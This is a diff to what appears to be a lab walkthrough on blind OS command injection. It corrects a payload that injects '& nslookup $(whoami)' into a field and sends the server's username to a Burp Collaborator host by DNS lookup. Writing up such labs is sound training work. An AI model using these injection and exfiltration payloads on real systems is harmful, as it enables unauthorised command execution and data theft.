@@ -257,7 +257,7 @@ Now click SEND button, click `POLL NOW button in `burp collaborator` ,
 
 ### Solution - 
 
-Same process as above but add this payload ` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` or ` & nslookup $(whoami0.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # `
+Same process as above but add this payload ` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` or ` & nslookup $(whoami).zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # `
 
 We get the username in the details panel
 
